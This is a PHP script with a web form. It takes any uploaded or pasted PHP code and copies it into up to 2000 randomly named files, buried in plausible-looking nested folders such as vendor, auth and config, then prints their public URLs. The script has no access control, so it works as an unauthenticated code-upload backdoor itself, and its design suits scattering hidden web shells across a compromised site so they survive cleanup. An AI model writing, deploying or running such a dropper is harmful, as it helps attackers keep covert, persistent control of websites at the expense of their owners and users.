<?php
ini_set('display_errors', 1);
error_reporting(E_ALL);

// --- CONFIG ---
$folders = ['api','assets','cache','config','controller','core','css','data','db','dist','docs','engine','files','functions','helpers','html','includes','js','layouts','lib','locales','logs','media','modules','pages','public','resources','routes','runtime','scripts','server','services','src','static','storage','styles','system','templates','themes','uploads','utils','vendor','views','widgets','xml','language','bootstrap','php','lang','test','admin','frontend','backend','client','image','res','json','migrations','components','output','v1','v2','configurations','ajax','partials','mail','model','database','extensions','plugins','forms','graphql','errors','cron','settings','debug','mobile','desktop','web','fonts','cdn','cdn-assets','sdk','sso','auth','oauth','search','editor','parser','robots','schema','manifest','seo'];
$fileNames = ['index','main','init','config','settings','router','connect','auth','login','logout','user','admin','dashboard','start','bootstrap','controller','view','model','cron','job','worker','handler','api','data','service','client','server','page','load','app','module','database','functions','helper','editor','upload','ajax','mail','form','search','session','routes','web','backend','frontend','script','engine','core','test','sample','home','profile','theme','seo','setup','install','widget','utils','token','access','meta','lang','i18n','build','result','stats','panel','request','response','middleware','storage','command','batch','common','logger','event','callback','debug','options','reset','notify','backup','parser','doc','schema','gateway','view2','upload2','scan','download','convert'];

$baseDir = __DIR__; // base dir
$log = [];

function generateRandomPaths($count, $folders, $fileNames): array {
    $paths = [];
    while (count($paths) < $count) {
        $depth = rand(3, 8);
        $parts = [];
        for ($i = 0; $i < $depth; $i++) {
            $parts[] = $folders[array_rand($folders)];
        }
        $filename = $fileNames[array_rand($fileNames)] . ".php";
        $path = implode("/", $parts) . "/" . $filename;
        $paths[$path] = true;
    }
    return array_keys($paths);
}

function tryMkdirWithFix($dir) {
    if (is_dir($dir)) return true;
    return @mkdir($dir, 0755, true);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $domain = trim($_POST['domain'] ?? '');
    $count = (int)($_POST['count'] ?? 0);
    $pastedCode = trim($_POST['pasted_code'] ?? '');
    $uploadedFile = $_FILES['file']['tmp_name'] ?? '';

    // Validate inputs
    if (!filter_var($domain, FILTER_VALIDATE_URL)) {
        $log[] = "❌ Invalid domain URL.";
    } elseif ($count <= 0 || $count > 2000) {
        $log[] = "❌ Count must be between 1 and 2000.";
    } elseif (empty($pastedCode) && (!isset($_FILES['file']) || !is_uploaded_file($uploadedFile))) {
        $log[] = "❌ Please upload a PHP file or paste PHP code.";
    } else {
        // Use uploaded file or create temp file from pasted code
        if (!empty($pastedCode)) {
            $uploadedFile = tempnam(sys_get_temp_dir(), 'phpcode_');
            file_put_contents($uploadedFile, $pastedCode);
        }

        $paths = generateRandomPaths($count, $folders, $fileNames);

        foreach ($paths as $relativePath) {
            $fullPath = $baseDir . '/' . $relativePath;
            $dir = dirname($fullPath);

            if (!is_dir($dir)) {
                if (!tryMkdirWithFix($dir)) continue;
            }

            if (!file_exists($fullPath)) {
                if (copy($uploadedFile, $fullPath)) {
                    $log[] = rtrim($domain, '/') . '/' . $relativePath;
                }
            }
        }

        // Clean up temp file
        if (!empty($pastedCode) && file_exists($uploadedFile)) {
            unlink($uploadedFile);
        }
    }
}
?>

<!-- HTML Form -->
<h2>Upload or Paste PHP code and generate files</h2>
<form method="post" enctype="multipart/form-data">
    <label>Enter your domain (e.g. https://example.com):</label><br>
    <input type="url" name="domain" style="width: 400px;" required><br><br>

    <label>How many files to generate? (1–2000):</label><br>
    <input type="number" name="count" min="1" max="2000" value="10" required><br><br>

    <label>Select a PHP file (optional):</label>
    <input type="file" name="file" accept=".php"><br><br>

    <label>OR Paste PHP code below:</label><br>
    <textarea name="pasted_code" rows="10" cols="80" placeholder="Paste your PHP code here..."></textarea><br><br>

    <button type="submit">Generate Files</button>
</form>

<?php if (!empty($log)): ?>
    <h3>✅ Generated File URLs:</h3>
    <pre><?php echo htmlspecialchars(implode("\n", $log)); ?></pre>
<?php endif; ?>
